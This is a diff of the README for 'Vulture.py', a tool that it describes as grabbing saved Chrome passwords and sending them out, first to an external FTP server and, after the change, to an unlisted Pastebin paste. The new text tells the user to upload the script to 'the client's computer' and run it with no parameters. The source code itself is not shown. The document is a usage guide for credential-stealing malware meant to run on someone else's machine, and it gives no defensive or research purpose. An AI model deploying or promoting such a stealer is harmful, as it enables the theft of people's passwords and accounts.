@@ -1,4 +1,6 @@
 # Vulture.py
-Vulture.py, used to grab and upload Chrome passwords to an external FTP server.
+Vulture.py, used to grab and upload Chrome passwords to an unlisted Pastebin paste.
 
-To use Vulture, you'll need to run it from the command line, using the command: `python3 vulture.py -s <SERVER IP> -u <FTP USERNAME> -p <FTP PASSWORD>` It'll just grab the passwords for now, but more options _will_ be added shortly.
+For use, just upload to the client's computer and run the command: ```python vulture.py```.
+
+There are no parameters.. **yet**
